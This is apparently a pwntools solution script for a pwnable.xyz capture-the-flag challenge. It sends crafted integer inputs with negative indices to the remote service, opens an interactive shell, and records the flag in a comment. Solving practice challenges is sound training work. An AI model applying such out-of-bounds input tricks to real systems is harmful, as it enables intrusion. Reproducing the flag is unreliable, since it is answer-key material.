from pwn import *

def solve():
    r = remote('svc.pwnable.xyz', 30003)
    # 0xb0000000
    r.sendline("92274688 92274688 -5")
    print(r.recvline())
    # 0xb500000000000000
    r.sendline("6521212260432478208 6521212260432478208 -6")
    r.interactive()
    # Flag: FLAG{u_cheater_used_a_debugger}

def main(): 
    solve()

if __name__ == '__main__':
    main()